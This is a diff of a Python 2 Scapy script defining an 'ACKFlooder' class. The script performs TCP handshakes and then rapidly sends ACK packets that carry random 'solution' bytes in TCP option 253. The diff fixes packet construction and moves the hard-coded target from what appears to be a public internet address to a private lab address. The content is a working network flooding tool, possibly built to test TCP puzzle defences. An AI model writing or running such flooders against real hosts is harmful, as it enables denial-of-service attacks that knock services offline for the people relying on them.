@@ -42,20 +42,27 @@ class ACKFlooder:
     def sendPacket(self, ip, sequence_number, ack_number):
         # build up the packet's options
         tsval = time.time()
-        options = ['Timestamp', (self.tsecr, tsval)]
+        options = [('Timestamp', (self.tsecr, tsval))]
 
         # build the solution
         mss_flipped = socket.htons(self.mss)
         opt_str = hex(mss_flipped)[2:].decode('hex')
-        opt_str += hex(self.w_scale)[2:].decode('hex')
+        opt_str += chr(self.w_scale)
 
         for i in np.arange(0, self.k):
             # get four random bytes
             rbyte = np.random.randint(low=0, high=np.iinfo(np.int32).max)
-            opt_str += hex(rbyte)[2:].decode('hex')
+            encoded = format(rbyte, 'x')
+            length = len(encoded)
+            encoded = encoded.zfill(length + length%2)
+            encoded = encoded.decode('hex')
+            opt_str += encoded
 
-        ack = TCP(sport=sport, dport=self.dport, flags="A",
-                  seq=sequence_number + 1, ack=ack_number)
+        opt_entry = (253, opt_str)
+        print opt_entry
+        options.append(opt_entry)
+        ack = TCP(dport=self.dport, flags="A",
+                  seq=sequence_number + 1, ack=ack_number, options=options)
         send(ip/ack)
 
     def startSending(self, maxPackets):
@@ -76,23 +83,26 @@ class ACKFlooder:
             if start_time == 0 or (self.curr_time - start_time >= self.interval):
                 sport = np.random.randint(low=0, high=65536)
                 ts = time.time()
-                syn = TCP(sport=sport, dport=self.dport, flags="S", seq=seq,
-                          options=['Timestamp', (ts, 0)])
+                syn = TCP(dport=self.dport, flags="S", seq=seq,
+                          options=[('Timestamp', (ts, 0))])
                 synack = sr1(ip/syn)
                 ack_num = synack.seq + 1
 
                 opts = synack[IP][TCP].options
-                for opcode, val in opts:
-                    if opcode == 'Timestamp':
-                        self.tsecr = val[0]
+                i = 0
+                for option in opts:
+                  opcode = option[0]
+                  val = option[1]
+                  if opcode == 'Timestamp':
+                      self.tsecr = val[0]
 
-                start_time = self.curr_time
+                start_time = time.time()
 
-            self.sendPacket(sport, seq, ack_num)
+            self.sendPacket(ip, seq, ack_num)
             self.num_sent_packets += 1
             self.curr_time = time.time()
 
 
 if __name__ == '__main__':
-    flooder = ACKFlooder(k=1, m=17, rate=0, dst='172.217.4.228')
+    flooder = ACKFlooder(k=2, m=17, rate=0, dst='10.1.6.3')
     flooder.startSending(2)
